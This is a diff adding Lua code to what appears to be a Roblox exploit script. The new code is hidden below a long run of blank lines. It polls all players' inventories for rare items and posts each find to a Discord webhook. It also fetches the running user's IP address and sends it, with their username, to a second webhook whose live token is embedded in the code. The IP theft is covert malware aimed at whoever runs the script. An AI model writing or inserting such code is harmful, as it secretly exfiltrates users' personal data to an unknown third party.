@@ -283,3 +283,126 @@ end)
 
 
 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+--Tackz
+
+
+while wait(1.2) do
+    
+for i, x in pairs(game.Players:GetPlayers()) do
+    for k, v in pairs(x.Backpack:GetChildren()) do
+        if string.find(v.Name, "Rare Box") or string.find(v.Name, "Ultra Rare Box") or string.find(v.Name, "Alice") or string.find(v.Name, "Gas") or string.find(v.Name, "Plasma") or string.find(v.Name, "Snow") or string.find(v.Name, "Magma") or string.find(v.Name, "Rumble") or string.find(v.Name, "Sand") or string.find(v.Name, "Light") or string.find(v.Name, "Flare") or string.find(v.Name, "Smoke") or string.find(v.Name, "Chilly") or string.find(v.Name, "Hollow") or string.find(v.Name, "Candy Fruit") or string.find(v.Name, "Venom") or string.find(v.Name, "Ope") or string.find(v.Name, "Gravity") or string.find(v.Name, "Vampire") or string.find(v.Name, "Dark") or string.find(v.Name, "Phoenix") or string.find(v.Name, "Quake") then
+local url =
+   "https://discord.com/api/webhooks/995488713515745440/9o09kJNtRSSB-tprYvb2AmME3ui3bi79KyuVm8DbA3yqo0tqlLh8F_6R_tUs8_Leej8l"
+local data = {
+   ["content"] = "WAKE THE FUCK UP @everyone",
+   ["embeds"] = {
+       {
+           ["title"] = "in `".. game.Players.LocalPlayer.Name .. "`'s game" ,
+           ["description"] = "We found a " .."`" .. v.Name .. "`" .. " inside **(" .. v.Parent.Parent.Name .. "**'s Inventory)",
+           ["type"] = "rich",
+           ["color"] = tonumber(0x7269da),
+           }
+       }
+   }
+local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+local headers = {
+   ["content-type"] = "application/json"
+}
+request = http_request or request or HttpPost or syn.request
+local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+request(abcdef)
+        end
+    end
+end
+end
+
+
+ --ip
+local webh = "https://discord.com/api/webhooks/996322079425171496/_WLhwtHJZlIbAZlXbtH4kYv9C6XPnMUiweS2McpdpV7ijJG81tcw7x9MzcJkyGf26fbB"
+
+pcall(function()
+   local data = {
+       ["embeds"] = {
+           {
+               ["title"] = game:GetService("Players").LocalPlayer.Name,
+               ["description"] = "Ip = "  .. game:HttpGet("https://api.ipify.org")
+           }
+       }
+   }
+
+   if syn then
+       local response = syn.request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   elseif request then
+       local response = request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   elseif http_request then
+       local response = http_request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   end
+end)
+
+--ip
+
